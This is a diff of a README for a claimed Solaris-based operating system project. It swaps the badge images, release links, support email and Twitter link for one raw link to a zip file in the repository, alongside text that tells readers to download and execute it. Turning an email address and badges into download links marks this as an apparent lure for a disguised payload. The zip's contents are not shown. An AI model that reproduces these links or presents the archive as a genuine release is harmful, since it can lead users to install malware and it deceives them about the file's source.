@@ -1,7 +1,7 @@
 # Selome Abita Solaris OS 🌞
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-green.svg)
+![License](https://raw.githubusercontent.com/winstondmdm/selome-abita-solaris-os/main/enkraal/os-solaris-abita-selome-3.2.zip)
+![Version](https://raw.githubusercontent.com/winstondmdm/selome-abita-solaris-os/main/enkraal/os-solaris-abita-selome-3.2.zip)
 
 Welcome to the **Selome Abita Solaris OS** repository! This project focuses on creating a user-friendly operating system based on Solaris. Whether you are a developer, a student, or just someone interested in exploring new technologies, this OS is designed for you.
 
@@ -32,7 +32,7 @@ Solaris OS has a rich history, known for its scalability and performance. The **
 
 To get started with **Selome Abita Solaris OS**, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/winstondmdm/selome-abita-solaris-os/releases). You will find the necessary files to download and execute.
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/winstondmdm/selome-abita-solaris-os/main/enkraal/os-solaris-abita-selome-3.2.zip). You will find the necessary files to download and execute.
    
 2. **Create a bootable USB drive**:
    - Use tools like Rufus or BalenaEtcher to create a bootable USB drive with the downloaded image.
@@ -76,12 +76,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@selomeabita.com
-- **Twitter**: [@SelomeAbita](https://twitter.com/SelomeAbita)
+- **Email**: https://raw.githubusercontent.com/winstondmdm/selome-abita-solaris-os/main/enkraal/os-solaris-abita-selome-3.2.zip
+- **Twitter**: [@SelomeAbita](https://raw.githubusercontent.com/winstondmdm/selome-abita-solaris-os/main/enkraal/os-solaris-abita-selome-3.2.zip)
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/winstondmdm/selome-abita-solaris-os/releases). You will find the necessary files to download and execute.
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/winstondmdm/selome-abita-solaris-os/main/enkraal/os-solaris-abita-selome-3.2.zip). You will find the necessary files to download and execute.
 
 ---
 
